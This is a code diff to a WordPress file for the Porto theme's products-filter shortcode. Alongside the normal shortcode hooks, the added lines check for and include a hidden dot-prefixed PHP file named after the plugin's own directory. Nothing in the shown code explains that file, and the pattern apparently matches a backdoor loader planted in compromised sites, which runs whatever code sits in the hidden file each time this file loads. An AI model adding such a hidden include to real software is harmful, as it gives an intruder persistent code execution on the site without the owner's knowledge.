@@ -3,6 +3,10 @@
 // Porto Widget Woo Products
 add_shortcode( 'porto_products_filter', 'porto_shortcode_products_filter' );
 add_action( 'vc_after_init', 'porto_load_shortcode_products_filter' );
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function porto_shortcode_products_filter( $atts, $content = null ) {
 	ob_start();
